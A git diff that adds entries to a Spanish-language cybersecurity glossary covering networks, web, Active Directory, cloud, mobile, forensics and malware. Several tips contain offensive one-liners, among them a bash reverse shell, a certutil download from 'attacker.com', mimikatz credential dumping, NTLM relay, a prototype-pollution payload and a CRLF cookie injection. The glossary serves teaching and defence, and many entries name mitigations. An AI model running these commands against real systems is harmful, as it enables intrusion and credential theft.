@@ -7,20 +7,20 @@ Cada término incluye su definición concreta, una intuición práctica y un eje
 
 ## Índice
 
-- [Red](#-red)
-- [Web](#-web)
-- [Reconocimiento y OSINT](#-reconocimiento-y-osint)
-- [Defensa y Blue Team](#-defensa-y-blue-team)
-- [Explotación y Post-explotación](#-explotación-y-post-explotación)
-- [Forense Digital](#-forense-digital)
-- [WiFi](#-wifi)
-- [Criptografía](#-criptografía)
-- [Active Directory y Windows](#-active-directory-y-windows)
-- [Cloud Security](#-cloud-security)
-- [Seguridad Móvil](#-seguridad-móvil)
-- [Malware y Análisis de Amenazas](#-malware-y-análisis-de-amenazas)
-- [Herramientas Esenciales](#-herramientas-esenciales)
-- [Tips Extra](#-tips-extra)
+- [Red](#red)
+- [Web](#web)
+- [Reconocimiento y OSINT](#reconocimiento-y-osint)
+- [Defensa y Blue Team](#defensa-y-blue-team)
+- [Explotación y Post-explotación](#explotación-y-post-explotación)
+- [Forense Digital](#forense-digital)
+- [WiFi](#wifi)
+- [Criptografía](#criptografía)
+- [Active Directory y Windows](#active-directory-y-windows)
+- [Cloud Security](#cloud-security)
+- [Seguridad Móvil](#seguridad-móvil)
+- [Malware y Análisis de Amenazas](#malware-y-análisis-de-amenazas)
+- [Herramientas Esenciales](#herramientas-esenciales)
+- [Tips Extra](#tips-extra)
 
 ---
 
@@ -51,6 +51,12 @@ Cada término incluye su definición concreta, una intuición práctica y un eje
 | **Tunneling** | Encapsular un protocolo dentro de otro para evadir restricciones de firewall o moverse en redes segmentadas. | Ejemplos: DNS tunneling (dnscat2), ICMP tunneling, HTTP tunneling. Genera tráfico anómalo que los IDS pueden detectar si no se hace con cuidado. |
 | **Proxy Chains** | Encadenar múltiples proxies (SOCKS, HTTP) para anonimizar o pivotar el tráfico. | `proxychains nmap -sT <target>` enruta el escaneo a través de la cadena definida en `/etc/proxychains.conf`. Añade latencia significativa. |
 | **mTLS** | TLS mutuo: tanto cliente como servidor se autentican con certificados. | Más seguro que TLS estándar; bloquea clientes no autorizados aunque tengan las credenciales correctas. Busca si el servidor acepta certificados autofirmados. |
+| **VLAN Hopping** | Saltar de una VLAN a otra abusando de DTP (switch spoofing) o del doble etiquetado 802.1Q. | Double tagging inyecta un frame con dos tags para que el switch lo reenvíe a otra VLAN. Mitiga desactivando DTP (`switchport nonegotiate`) y evitando la VLAN nativa en troncales. |
+| **NAC (Network Access Control)** | Control que admite dispositivos en la red según su identidad o postura (802.1X, perfilado por MAC). | Bypass habitual: clonar la MAC de un dispositivo confiable (impresora, VoIP) o puentear tras un teléfono IP. `macchanger -m <mac> eth0`. |
+| **802.1X** | Autenticación por puerto en redes cableadas o WiFi, con EAP contra un servidor RADIUS. | Sin MACsec se puede bypassear con un puente transparente (`nac_bypass`). En WiFi empresarial, `hostapd-wpe` captura y craquea credenciales MSCHAPv2. |
+| **LLMNR/NBT-NS Poisoning** | Responder a resoluciones de nombre fallidas en Windows para capturar hashes NetNTLM de las víctimas. | `responder -I eth0`. El NetNTLMv2 se craquea (`hashcat -m 5600`) o se reenvía con `ntlmrelayx`. Mitiga deshabilitando LLMNR y NBT-NS por GPO. |
+| **mitm6** | Abusar de IPv6 (DHCPv6 + DNS) en redes solo-IPv4 para convertirse en DNS y forzar autenticación vía WPAD. | `mitm6 -d dominio.local` junto a `ntlmrelayx -6`. Mitiga bloqueando DHCPv6 entrante y deshabilitando WPAD si no se usa. |
+| **QUIC** | Transporte sobre UDP/443 con TLS 1.3 integrado; base de HTTP/3. | Evade inspección y firmas basadas en TCP. `nmap` no lo detecta por defecto; revisa tráfico UDP/443 saliente inesperado y usa sondas específicas de HTTP/3. |
 
 ---
 
@@ -81,6 +87,12 @@ Cada término incluye su definición concreta, una intuición práctica y un eje
 | **CORS mal configurado** | Cross-Origin Resource Sharing permisivo que permite a dominios no autorizados leer respuestas con credenciales. | `Access-Control-Allow-Origin: *` con `Access-Control-Allow-Credentials: true` es la combinación crítica. Prueba con un origen arbitrario y observa la respuesta. |
 | **Business Logic Flaw** | Fallo en la lógica de negocio de la aplicación que permite abusar flujos legítimos. | Ejemplos: precio negativo en un carrito, saltarse pasos de un wizard, reutilizar cupones. No los detecta un escáner automático; requiere análisis manual del flujo. |
 | **GraphQL** | Lenguaje de consulta para APIs que expone un único endpoint con capacidad de introspección. | Ejecuta `{__schema{types{name}}}` para enumerar tipos. Busca mutaciones sin autorización, IDOR en queries y query depth abuse (DoS). |
+| **Prototype Pollution** | Inyectar propiedades en `Object.prototype` de JavaScript para alterar el comportamiento de toda la aplicación. | Payload: `{"__proto__":{"isAdmin":true}}` en un JSON. Escala a RCE en Node (gadgets de `child_process`) o a XSS en cliente. Busca merges recursivos sin validar claves. |
+| **CSP (Content Security Policy)** | Cabecera que restringe los orígenes de scripts y recursos para mitigar XSS. | Revisa directivas débiles: `unsafe-inline`, `unsafe-eval`, comodines o dominios JSONP que permiten bypass. `csp-evaluator.withgoogle.com` las audita. |
+| **Subdomain Takeover** | Reclamar un subdominio cuyo CNAME apunta a un servicio externo ya dado de baja. | Si `app.target.com` apunta a un bucket o GitHub Pages sin reclamar, registras el recurso y sirves tu contenido. Detecta con `subzy` o `nuclei -t http/takeovers/`. |
+| **Web Cache Poisoning** | Envenenar una caché compartida con una respuesta maliciosa vía cabeceras no incluidas en la clave de caché. | Prueba `X-Forwarded-Host` o `X-Forwarded-Scheme` reflejados. La extensión Param Miner de Burp descubre cabeceras unkeyed. |
+| **Mass Assignment** | Enviar parámetros extra que el backend vincula a campos del modelo sin filtrar (`role`, `is_admin`). | En un registro, añade `"role":"admin"` al cuerpo JSON. Común en frameworks con binding automático (Rails, Spring). Revisa qué campos acepta cada endpoint. |
+| **CRLF Injection** | Inyectar `\r\n` en cabeceras para dividir la respuesta, fijar cookies o envenenar logs. | `%0d%0aSet-Cookie:session=...` en un parámetro reflejado en una cabecera. Escala a XSS o cache poisoning (HTTP response splitting). |
 
 ---
 
@@ -102,6 +114,9 @@ Cada término incluye su definición concreta, una intuición práctica y un eje
 | **Dorking en GitHub** | Buscar credenciales, tokens y configuraciones sensibles expuestas en repositorios públicos. | `org:target password`, `filename:.env DB_PASSWORD`, `filename:id_rsa`. Usa `trufflehog` o `gitleaks` para análisis masivo de repos. |
 | **Pastebin / Leaks** | Plataformas donde se publican (a veces por accidente) credenciales, dumps y tokens. | Monitorea con `pwndb`, HIBP API o alerta de Google sobre `site:pastebin.com "target.com"`. |
 | **Reconocimiento activo** | Interacción directa con el objetivo para obtener información: escaneos, banners, crawling. | Genera logs en el objetivo. Documenta con precisión qué acciones tomaste y en qué momento para el informe de pentest. |
+| **Favicon Hashing** | Pivotar infraestructura por el hash MMH3 del favicon, que es idéntico en hosts del mismo stack. | En Shodan: `http.favicon.hash:-1234567890`. Calcula el hash con `mmh3` sobre el favicon en base64. Útil para hallar paneles ocultos (C2, admin). |
+| **Censys** | Motor que indexa hosts, certificados y servicios de internet con consultas estructuradas. | `services.tls.certificates.leaf_data.subject.common_name: target.com`. Complementa a Shodan con mejor cobertura de certificados y escaneo TLS. |
+| **Maltego** | Herramienta de análisis de enlaces que grafica relaciones entre entidades (dominios, personas, IPs). | Con transforms pivotas de un correo a dominios, perfiles e infraestructura asociada. Visualiza el alcance de una investigación OSINT. |
 
 ---
 
@@ -125,6 +140,11 @@ Cada término incluye su definición concreta, una intuición práctica y un eje
 | **WAF** | Web Application Firewall: filtra, monitorea y bloquea tráfico HTTP malicioso antes de que llegue a la aplicación. | Herramientas: ModSecurity, AWS WAF, Cloudflare WAF. Complementa pero no reemplaza el desarrollo seguro. Aprende a hacer bypass de WAF en ejercicios autorizados. |
 | **Honeypot** | Sistema trampa diseñado para atraer y registrar la actividad de atacantes. | Tipos: low-interaction (simula servicios) y high-interaction (sistema real). Herramientas: Cowrie (SSH), HoneyDB. Alerta inmediata si alguien lo toca. |
 | **Incident Response** | Proceso estructurado para manejar incidentes de seguridad: preparación, detección, contención, erradicación, recuperación y lecciones aprendidas. | Sigue el marco NIST SP 800-61 o SANS PICERL. Documenta cada acción con timestamp para el informe post-incidente. |
+| **SOAR** | Security Orchestration, Automation and Response: automatiza playbooks y respuesta entre herramientas. | Plataformas: Shuffle (open source), Tines, Cortex XSOAR. Reduce el MTTR automatizando el enriquecimiento de IOCs y la contención inicial. |
+| **Reglas Sigma** | Formato genérico y portable para escribir detecciones sobre logs, convertible a cualquier SIEM. | `sigma convert -t splunk regla.yml` traduce a la query nativa. Repositorio: SigmaHQ. Desacopla la lógica de detección del backend concreto. |
+| **Canary Tokens** | Señuelos (archivos, URLs, credenciales) que alertan en cuanto alguien los usa. | Genera en `canarytokens.org` un documento que llama a casa al abrirse o una AWS key falsa. Detección temprana de movimiento lateral y exfiltración. |
+| **Purple Team** | Ejercicio colaborativo donde el equipo rojo ejecuta TTPs y el azul valida la detección en tiempo real. | Mapea cada técnica a ATT&CK y mide la cobertura. Atomic Red Team para emular, VECTR para registrar resultados. |
+| **UEBA** | User and Entity Behavior Analytics: detecta anomalías comparando la actividad contra una línea base de comportamiento. | Señala logins a horas inusuales, accesos masivos a datos o viajes imposibles. Complementa las reglas estáticas con detección por desviación. |
 
 ---
 
@@ -142,6 +162,13 @@ Cada término incluye su definición concreta, una intuición práctica y un eje
 | **ROP (Return-Oriented Programming)** | Técnica de explotación que encadena pequeños fragmentos de código existente (gadgets) para ejecutar lógica arbitraria sin inyectar shellcode. | Útil cuando DEP/NX está activo. `ROPgadget`, `ropper` o pwntools automatizan la búsqueda de gadgets. |
 | **Race Condition** | Condición donde el resultado depende del orden de ejecución de procesos concurrentes, que puede manipularse. | Ejemplos: TOCTOU (Time of Check to Time of Use), límites de tasa en APIs. Herramienta: Turbo Intruder en Burp para enviar requests simultáneas. |
 | **Token Impersonation** | En Windows, robar o duplicar el token de acceso de un proceso privilegiado para actuar como él. | Requiere `SeImpersonatePrivilege` o `SeAssignPrimaryTokenPrivilege`. Herramientas: `PrintSpoofer`, `JuicyPotato`, `GodPotato`. |
+| **Reverse Shell / Bind Shell** | Reverse: la víctima conecta de vuelta al atacante. Bind: la víctima escucha y el atacante conecta. | Reverse evade firewalls de entrada: `bash -i >& /dev/tcp/10.0.0.1/443 0>&1`, listener `nc -lvnp 443`. Estabiliza con `python3 -c 'import pty;pty.spawn("/bin/bash")'`. |
+| **Shellcode** | Código máquina en crudo, autocontenido y normalmente sin nulos, que se inyecta para obtener ejecución. | Genera con `msfvenom -p linux/x64/exec CMD=id -f c`. En exploits de memoria se coloca donde apunte el RIP/EIP controlado. Excluye bytes malos con `-b`. |
+| **Process Injection** | Ejecutar código en el espacio de memoria de otro proceso para evadir defensas o escalar. | Clásico: `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread`. Variantes: APC injection, process hollowing. Detectable con SYSMON Event ID 8 y 10. |
+| **DLL Hijacking** | Colocar una DLL maliciosa en una ruta de búsqueda anterior a la legítima para que el programa la cargue. | Enumera DLLs ausentes con Process Monitor (filtro `NAME NOT FOUND`). Vector de persistencia y de escalada si el proceso corre como SYSTEM. |
+| **UAC Bypass** | Elevar de usuario a administrador sin el prompt de UAC abusando de binarios auto-elevables. | `fodhelper.exe` o `computerdefaults.exe` con hijack de registro. Catálogo de referencia: UACME. No cruza una frontera de seguridad real, pero facilita la post-explotación. |
+| **Credential Dumping** | Extraer credenciales (hashes, tickets, texto claro) de memoria, SAM, LSASS o DPAPI. | `mimikatz "sekurlsa::logonpasswords"`, volcado de LSASS con `comsvcs.dll`, o `secretsdump.py` sobre los hives. Protege con Credential Guard y PPL. |
+| **GTFOBins** | Catálogo de binarios Unix legítimos abusables para escalar privilegios o romper restricciones. | Si `find` tiene SUID: `find . -exec /bin/sh -p \; -quit`. Consulta `gtfobins.github.io` por binario. Equivalente Windows: LOLBAS. |
 
 ---
 
@@ -159,6 +186,11 @@ Cada término incluye su definición concreta, una intuición práctica y un eje
 | **MFT (Master File Table)** | Tabla maestra del sistema de archivos NTFS que registra metadatos de cada archivo: nombres, timestamps, atributos. | `analyzeMFT.py` o `mftparser` extraen información. La MFT puede revelar archivos borrados y rutas de acceso aunque el archivo ya no exista. |
 | **Registro de Windows** | Base de datos jerárquica que almacena configuración del SO, aplicaciones y actividad del usuario. | Hives clave: `NTUSER.DAT` (actividad de usuario), `SYSTEM`, `SOFTWARE`, `SAM` (hashes locales). Analiza con `RegRipper` o `Autopsy`. |
 | **Análisis de malware** | Examinar una muestra maliciosa para entender su comportamiento, capacidades e IOCs. | Dos enfoques: **estático** (sin ejecutar: `strings`, `pestudio`, desensamblado) y **dinámico** (en sandbox: Cuckoo, ANY.RUN, FlareVM). |
+| **Orden de volatilidad** | Prioridad de captura de la evidencia más efímera primero (RFC 3227). | Secuencia: registros y caché de CPU, RAM, tablas de red/ARP, procesos, disco, logs remotos, soporte físico. Captura la RAM antes de apagar o tocar el disco. |
+| **File Carving** | Recuperar archivos del espacio no asignado por sus cabeceras y pies, sin depender del sistema de archivos. | `foremost -i disco.dd -o salida/`, `scalpel`, `photorec`. Recupera datos borrados o de particiones corruptas identificando firmas (magic bytes). |
+| **Timestomping** | Alterar las marcas temporales (MACB) de un archivo para ocultar la actividad del atacante. | Técnica ATT&CK T1070.006. Detecta comparando `$STANDARD_INFORMATION` contra `$FILE_NAME` en la MFT; un desfase delata la manipulación. |
+| **UsnJrnl** | Journal de cambios de NTFS que registra creación, borrado y renombrado de archivos. | Ruta `$Extend\$UsnJrnl:$J`. Aunque el archivo se borre, su paso queda registrado. Parsea con `MFTECmd` para reconstruir la actividad. |
+| **Baseline (Last Known Good)** | Estado de referencia conocido como bueno contra el que se comparan los artefactos durante la investigación. | Compara servicios, drivers y claves `Run` actuales contra la baseline para aislar los cambios que introdujo el atacante. Mantén imágenes doradas versionadas. |
 
 ---
 
@@ -176,6 +208,10 @@ Cada término incluye su definición concreta, una intuición práctica y un eje
 | **WPS Attack** | Atacar el PIN WPS de 8 dígitos (en realidad dos mitades de 4 dígitos: 10.000 + 1.000 combinaciones). | `reaver -i wlan0mon -b <BSSID> -vv`. Muchos routers modernos tienen protección de bloqueo. Si WPS está activo, es un vector viable. |
 | **WPA3** | Evolución de WPA2 con handshake SAE (Dragonfly): resistente a ataques de diccionario offline. | `hcxdumptool` soporta captura de SAE, pero el cracking es significativamente más costoso. Vulnerabilidades conocidas: Dragonblood (2019). |
 | **Visualización** | Mapas de SSID/BSSID/potencia de señal para auditoría de cobertura y detección de APs no autorizados. | Herramientas: Kismet (potente, en tiempo real), Airgraph-ng (grafo de clientes/APs), WiFiAnalyzer (móvil). |
+| **WEP** | Cifrado WiFi obsoleto (RC4 con IV de 24 bits), roto desde 2001 por reutilización de IV. | Si lo encuentras, cae en minutos: captura IVs con `airodump-ng` y recupera la clave con `aircrack-ng -b <BSSID> captura.cap`. Su sola presencia es un hallazgo crítico. |
+| **PMF (802.11w)** | Protección de frames de gestión que impide ataques de deauth falsificados. | Obligatorio en WPA3. Si está activo, el deauth clásico falla; revisa la columna MFP en `airodump-ng`. Dificulta forzar la captura de handshakes. |
+| **Wardriving** | Mapear redes WiFi y su geolocalización desplazándose con una antena y GPS. | `kismet` con GPS, o la app WiGLE que alimenta su base pública de BSSIDs. Útil para inventario de cobertura y detección de rogue APs. |
+| **Karma Attack** | AP falso que responde a cualquier probe request, haciéndose pasar por las redes que el cliente busca. | Herramientas: `hostapd-mana`, WiFi Pineapple. Captura clientes con redes preferidas (PNL) abiertas. PMF y la validación de SSID lo mitigan. |
 
 ---
 
@@ -193,6 +229,12 @@ Cada término incluye su definición concreta, una intuición práctica y un eje
 | **Key Exchange (DH/ECDH)** | Protocolo que permite a dos partes establecer un secreto compartido sobre un canal inseguro. | Diffie-Hellman clásico y su variante de curva elíptica (ECDH) son la base de TLS y SSH. Vulnerable a downgrade si se permiten grupos débiles (DH-1024). |
 | **Esteganografía** | Ocultar información dentro de archivos aparentemente inocuos (imágenes, audio, video). | `steghide`, `zsteg` para análisis. Relevante en CTFs y en análisis forense de malware que usa imágenes para C2 (steganoC2). |
 | **Cifrado de disco** | Proteger el volumen completo o particiones con cifrado (BitLocker, LUKS, VeraCrypt). | Bitlocker puede desbloquearse con la clave de recuperación o atacarse si TPM está mal configurado. LUKS en Linux usa PBKDF2/argon2 para derivar la clave maestra. |
+| **Padding Oracle** | Abusar de un servicio que revela si el padding de un descifrado es válido para recuperar el texto claro sin la clave. | Afecta a CBC sin MAC. Herramienta: `padbuster`. Descifra y forja tokens cifrados byte a byte. Mitiga con AEAD (AES-GCM) o encrypt-then-MAC. |
+| **Length Extension Attack** | Extender un MAC inseguro del tipo `H(secreto + mensaje)` sin conocer el secreto. | Afecta a MD5, SHA-1 y SHA-256 usados como MAC por concatenación. Herramienta: `hashpump`. Mitiga usando HMAC en lugar de concatenar. |
+| **Nonce Reuse** | Reutilizar un nonce o IV en cifrados de flujo o en modos como GCM, lo que rompe confidencialidad o integridad. | En AES-GCM, dos mensajes con el mismo nonce permiten recuperar la clave de autenticación y forjar mensajes. Verifica que el nonce sea único por operación. |
+| **HMAC** | Código de autenticación de mensajes basado en hash con clave, resistente a length extension. | `HMAC(k, m)` garantiza integridad y autenticidad. Úsalo en vez de `H(secreto + mensaje)`. Base de las firmas JWT HS256 y de los webhooks firmados. |
+| **Rainbow Tables** | Tablas precomputadas de hashes para revertir contraseñas sin fuerza bruta en el momento. | Las derrota un salt único por usuario. Sin salt, un `MD5(password)` cae al instante. Herramientas históricas: `rcracki`, Ophcrack. |
+| **Perfect Forward Secrecy (PFS)** | Propiedad por la que comprometer la clave privada del servidor no descifra las sesiones pasadas. | La aportan los intercambios efímeros (ECDHE). Verifica con `nmap --script ssl-enum-ciphers`; las suites sin `DHE`/`ECDHE` no tienen PFS. |
 
 ---
 
@@ -213,6 +255,12 @@ Cada término incluye su definición concreta, una intuición práctica y un eje
 | **BloodHound** | Herramienta de análisis de grafos que visualiza relaciones de AD y encuentra caminos de ataque hacia Domain Admin. | Recoge datos con `SharpHound` o `bloodhound-python`. Busca la query "Shortest path to Domain Admins" para encontrar el camino más corto. |
 | **LAPS** | Local Administrator Password Solution: gestiona contraseñas de administrador local únicas y rotativas por equipo. | Mitiga Pass-the-Hash lateral. Verifica si está activo: `Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd`. |
 | **GPO** | Group Policy Object: políticas que se aplican a usuarios y equipos del dominio (scripts, restricciones, configuraciones). | GPOs mal configuradas con permisos de escritura para usuarios no privilegiados permiten escalada de privilegios o persistencia. Enumera con BloodHound. |
+| **SPN (Service Principal Name)** | Identificador que asocia un servicio a una cuenta en Kerberos; prerequisito del Kerberoasting. | Enumera cuentas con SPN: `GetUserSPNs.py dominio/user:pass`. Un SPN sobre una cuenta de usuario (no gMSA) es objetivo directo de Kerberoasting. |
+| **Delegación Kerberos** | Permite a un servicio actuar en nombre de un usuario. Variantes: unconstrained, constrained y RBCD. | Unconstrained guarda TGTs robables en memoria. RBCD se abusa con escritura sobre `msDS-AllowedToActOnBehalfOfOtherIdentity`. Enumera caminos con BloodHound. |
+| **ADCS / ESC** | Active Directory Certificate Services; plantillas mal configuradas (ESC1-ESC8) permiten escalar a Domain Admin. | ESC1: la plantilla deja indicar el SAN. `certipy find -vulnerable`, luego `certipy req` para pedir un certificado como administrador. |
+| **NTLM Relay** | Reenviar una autenticación NTLM capturada a otro servicio en vez de craquearla. | `ntlmrelayx.py -t ldaps://dc -smb2support`. Combínalo con coerción (PetitPotam, PrinterBug). Mitiga con firmado SMB/LDAP y EPA. |
+| **Shadow Credentials** | Añadir claves al atributo `msDS-KeyCredentialLink` de una cuenta para autenticarse como ella vía PKINIT. | Requiere permiso de escritura sobre el objeto. `certipy shadow auto -account victima`. Alternativa sigilosa a resetear la contraseña. |
+| **DPAPI** | API de protección de datos de Windows que cifra secretos (navegador, WiFi, RDP) por usuario o máquina. | Las master keys se descifran con `mimikatz "dpapi::masterkey"` o con el backup key del dominio. Volcado masivo con `SharpDPAPI` o `impacket-dpapi`. |
 
 ---
 
@@ -229,6 +277,10 @@ Cada término incluye su definición concreta, una intuición práctica y un eje
 | **ScoutSuite / Prowler** | Herramientas de auditoría multi-cloud que evalúan configuraciones contra CIS Benchmarks y buenas prácticas. | `scoutsuite aws --profile <profile>` genera un informe HTML. `prowler -M html` hace lo mismo con enfoque en compliance (CIS, PCI-DSS, HIPAA). |
 | **CloudTrail / Audit Logs** | Servicio de registro de actividad API en AWS (CloudTrail), GCP (Cloud Audit Logs) y Azure (Activity Log). | Esencial para forense cloud. Busca creaciones de usuarios IAM, cambios en Security Groups, llamadas a `GetSecretValue` o `AssumeRole` inusuales. |
 | **Secrets Manager** | Servicios para almacenar y rotar secretos: AWS Secrets Manager, GCP Secret Manager, Azure Key Vault, HashiCorp Vault. | Mejor alternativa a variables de entorno o código fuente. Audita quién tiene permisos para leer qué secreto y si la rotación automática está activa. |
+| **AssumeRole / Role Chaining** | Asumir roles IAM, encadenados, para moverse lateralmente o escalar privilegios en la nube. | `aws sts assume-role --role-arn <arn> --role-session-name x`. Busca roles con `sts:AssumeRole` sobre otros; `pacu` y `PMapper` grafican los caminos. |
+| **OIDC Federation (CI/CD)** | Confianza federada que deja a un pipeline (GitHub Actions) asumir un rol cloud sin claves de larga vida. | Riesgo: condiciones de confianza laxas (`sub` con comodín) dejan que cualquier repo asuma el rol. Audita el trust policy del rol federado. |
+| **CSPM** | Cloud Security Posture Management: detección continua de configuraciones inseguras contra benchmarks. | Herramientas: Prowler, ScoutSuite, Steampipe. Detecta buckets públicos, security groups abiertos y cuentas sin MFA de forma recurrente, no puntual. |
+| **Entra ID (Azure AD)** | Directorio de identidades de Microsoft en la nube; objetivo equivalente al AD on-premise. | Enumera con `AADInternals` o `roadrecon`. Vectores: consent phishing (OAuth), device code phishing y abuso de roles privilegiados (Global Admin). |
 
 ---
 
@@ -243,6 +295,9 @@ Cada término incluye su definición concreta, una intuición práctica y un eje
 | **Deep Links** | URLs especiales (`scheme://`) que abren una app en una pantalla específica o ejecutan una acción. | Analiza el `AndroidManifest.xml` para encontrar Activities exportadas que acepten Intents. Un deep link malicioso puede bypassear controles de autenticación. |
 | **IPA Analysis** | Análisis de aplicaciones iOS (formato IPA = ZIP con binario Mach-O y recursos). | Desencripta con `frida-ios-dump` o en jailbreak con `clutch`. Analiza el binario con `class-dump`, Hopper o Ghidra. Busca claves en Keychain y plist. |
 | **OWASP Mobile Top 10** | Lista de los riesgos más críticos en apps móviles: credenciales inseguras, autenticación débil, almacenamiento inseguro, etc. | Usa como checklist en cada auditoría móvil. Complementa con la guía MSTG (Mobile Security Testing Guide) de OWASP para procedimientos detallados. |
+| **Root/Jailbreak Detection** | Comprobaciones de la app que detectan un dispositivo comprometido para bloquear su ejecución. | Bypass con `objection --gadget com.app explore` seguido de `android root disable`. Busca cadenas como `/system/bin/su` o `test-keys` en el binario. |
+| **Keystore / Keychain** | Almacenes protegidos por hardware para claves y secretos (Android Keystore, iOS Keychain). | Un secreto en `SharedPreferences` o en un plist, en vez del almacén seguro, es un hallazgo común. En iOS con jailbreak: `keychain_dumper`. |
+| **MobSF** | Mobile Security Framework: análisis estático y dinámico automatizado de APK e IPA. | `docker run -p 8000:8000 opensecurity/mobile-security-framework-mobsf`. Genera un informe con permisos, secretos hardcodeados y llamadas peligrosas. |
 
 ---
 
@@ -260,6 +315,11 @@ Cada término incluye su definición concreta, una intuición práctica y un eje
 | **Rootkit** | Malware diseñado para ocultar su presencia y la de otros programas en el sistema, a menudo a nivel de kernel. | Tipos: userland (hooks en DLLs), kernel (drivers maliciosos), bootkit (infección del MBR/UEFI). Detección: volatility (`malfind`, `ldrmodules`), comparación de listas de procesos. |
 | **Fileless Malware** | Malware que opera en memoria sin escribir archivos en disco, abusando de herramientas legítimas del sistema (PowerShell, WMI, LOLBins). | Muy difícil de detectar con AV tradicional. Deja huellas en logs de PowerShell, eventos de WMI, y en memoria. Detecta con EDR y reglas de comportamiento. |
 | **LOLBins** | Living Off the Land Binaries: herramientas legítimas del SO (certutil, regsvr32, mshta, wscript) abusadas para ejecutar código malicioso. | `certutil -urlcache -split -f http://attacker.com/shell.exe shell.exe`. El objetivo es mezclarse con tráfico legítimo. Monitorea estas ejecuciones con Event ID 4688 y SYSMON. |
+| **AMSI Bypass** | Evadir la Antimalware Scan Interface que inspecciona scripts (PowerShell, VBA) antes de ejecutarlos. | Técnica habitual: parchear `amsi.dll!AmsiScanBuffer` en memoria o forzar un error en su inicialización. Deja rastro en los logs de ScriptBlock de PowerShell. |
+| **Unhooking** | Restaurar las funciones originales de las DLLs del sistema para eludir los hooks de un EDR en user-land. | Recarga una copia limpia de `ntdll.dll` desde disco o KnownDlls. Relacionado: syscalls directos o indirectos para no pasar por el hook. |
+| **Loader / Stager** | Primera etapa que descarga, descifra y ejecuta en memoria el payload final (beacon). | Minimiza la huella en disco; el payload real nunca se escribe. Extrae la siguiente etapa de la memoria con `pe-sieve` o con `malfind` de Volatility. |
+| **Ransomware** | Malware que cifra archivos (y a menudo exfiltra) exigiendo un pago por la clave. | IOCs: borrado de Shadow Copies (`vssadmin delete shadows`), renombrado masivo de extensiones, nota de rescate. La doble extorsión suma cifrado y filtración. |
+| **Sandbox Evasion** | Técnicas del malware para detectar un entorno de análisis y no detonar en él. | Comprueba número de CPUs, artefactos de VM, interacción del usuario o temporizadores largos. En análisis, endurece la VM (oculta `VBOX`) y acelera los relojes. |
 
 ---
 
@@ -283,6 +343,11 @@ Cada término incluye su definición concreta, una intuición práctica y un eje
 | **Nuclei** | Escaneo de vulnerabilidades | Motor de templates para detección automatizada de vulnerabilidades. `nuclei -u https://target.com -t cves/`. Comunidad muy activa de templates. |
 | **Gobuster / ffuf** | Web / Enumeración | Enumeración de directorios y subdominios. `gobuster dir -u https://target -w wordlist -x php,html`. |
 | **CyberChef** | Utilidades | Aplicación web para transformaciones de datos: decode base64, XOR, hash, parsing de formatos. Alias: "la navaja suiza de los datos". |
+| **NetExec (nxc)** | Active Directory / Red | Sucesor mantenido de CrackMapExec. `nxc smb <rango> -u user -p pass --shares`. Soporta SMB, WinRM, LDAP, MSSQL y SSH; valida credenciales y hashes a escala de red. |
+| **Responder** | Active Directory / MITM | Envenena LLMNR/NBT-NS/mDNS para capturar hashes NetNTLM. `responder -I eth0 -wd`. Combínalo con `ntlmrelayx` para relay. Clave al inicio de un pentest interno. |
+| **mimikatz** | Post-explotación Windows | Extrae credenciales y abusa de Kerberos: `sekurlsa::logonpasswords`, `lsadump::dcsync`, `kerberos::golden`. Para memoria usa `sekurlsa`; para la SAM, `lsadump`. |
+| **Rubeus** | Active Directory / Kerberos | Toolkit en C# para Kerberos: `kerberoast`, `asreproast`, `s4u` (delegación), `ptt`. Alternativa a Impacket cuando ya tienes ejecución en un host Windows. |
+| **Ligolo-ng** | Pivoting | Crea una interfaz TUN para enrutar hacia redes internas sin proxychains. Más rápido y estable que chisel/SOCKS para escanear la subred comprometida como si fuera local. |
 
 ---
 
